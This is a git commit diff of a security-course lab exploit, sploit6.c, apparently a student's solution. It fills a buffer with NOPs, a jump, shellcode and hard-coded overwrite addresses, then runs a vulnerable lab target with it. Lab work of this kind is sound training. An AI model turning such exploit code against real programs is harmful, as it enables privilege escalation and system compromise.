eaea99c40f7a8149a2744370395bbd0a70f834c0
zhenyit <37541366+iynehzgnat@users.noreply.github.com>
2020-10-04 21:10:16 +0800

    Update sploit6.c

--- lab1/sploits/sploit6.c
+++ lab1/sploits/sploit6.c
@@ -5,20 +5,51 @@
 #include "shellcode-64.h"
 
 #define TARGET "../targets/target6"
+#define BUFFER_SIZE 256
+#define NOP 0x90
 
 int main(void)
 {
-  char *args[3];
-  char *env[1];
+        char *args[3];
+        char *env[1];
 
-  args[0] = TARGET; 
-  args[1] = "hi there"; 
-  args[2] = NULL;
-  
-  env[0] = NULL;
+        char attack_buffer[BUFFER_SIZE];
 
-  if (0 > execve(TARGET, args, env))
-    fprintf(stderr, "execve failed.\n");
+        int i;
+        for (i = 0; i < 256; i++)
+        {
+                attack_buffer[i] = NOP;
+        }
 
-  return 0;
+        short *a = (short *) &attack_buffer[0];
+        *a = 0x08eb;
+
+        char *ptr1 = (char *) &attack_buffer[4];
+        *ptr1 = 0x1;
+
+        char *ptr = attack_buffer + 12;
+        for (i = 0; i < strlen(shellcode); i++)
+        {
+                ptr[i] = shellcode[i];
+        }
+
+        int *c = (int *) &attack_buffer[72];
+        *c = 0x0104ee28;
+
+        int *d = (int *) &attack_buffer[76];
+        *d = 0x40a4fe68;
+
+
+        attack_buffer[80] = 0x00;
+
+        args[0] = TARGET;
+        args[1] = attack_buffer;
+        args[2] = NULL;
+
+        env[0] = NULL;
+
+        if (0 > execve(TARGET, args, env))
+                fprintf(stderr, "execve failed.\n");
+
+        return 0;
 }
